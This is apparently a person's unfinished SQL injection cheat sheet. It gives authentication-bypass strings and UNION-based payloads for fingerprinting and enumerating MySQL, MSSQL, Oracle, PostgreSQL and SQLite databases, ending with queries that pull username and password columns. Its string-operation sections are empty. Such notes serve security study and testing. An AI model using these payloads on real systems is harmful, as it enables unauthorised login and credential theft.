## SQLI-Query-Notes
### Authentication Bypass
```
● ' OR 1=1--                    : closes the current string ('), injects an always-true condition (OR 1=1), and comments out the remaining query (--)
● admin'--                      : uses admin as the username, closes the current string ('), and comments out the rest of the query (--)
```
### Basic String Operations
#### Concantenation
```
● MySQL / Microsoft SQL Server  : 
● Oracle                        : 
● PostgreSQL                    : 
● SQLite                        : 
```
#### Substring
```
● MySQL / Microsoft SQL Server  :
● Oracle                        :
● PostgreSQL                    : 
● SQLite                        :
```
### UNION-Based SQLI
#### Column Count Determination
```
● ' UNION SELECT NULL--         : increment the number of NULL values until it shows an error, then the previous NULL count will be the column count
● ' ORDER BY 1--                : used for the same purpose as the previous one(' UNION SELECT NULL--), here increment the numeric value
```
#### Database Version
```
● MySQL / Microsoft SQL Server  : ' UNION SELECT @@version, NULL-- 
● Oracle                        : ' UNION SELECT BANNER, NULL FROM v$version-- 
● PostgreSQL                    : ' UNION SELECT version(), NULL-- 
● SQLite                        : ' UNION SELECT sqlite_version(), NULL-- 
```
#### Database Contents
```
● MySQL / Microsoft SQL Server  : ' UNION SELECT table_name FROM information_schema.tables-- (if column count more than one put NULL after table_name)
  / PostgreSQL                    ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='put_table_name_here'--
                                  ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--

● Oracle                        : ' UNION SELECT table_name FROM all_tables-- (if column count more than one, put NULL after table_name)
                                  ' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'put_table_name_here'--
                                  ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--

● SQLite                        : ' UNION SELECT name FROM sqlite_schema WHERE type = 'table'--
                                  ' UNION SELECT name FROM sqlite_schema WHERE type = 'table' AND name NOT LIKE 'sqlite_%'--
                                    (it filters out SQLite's internal metadata tables)
                                  ' UNION SELECT name FROM pragma_table_info('put_table_name_here')--
                                  ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--
```
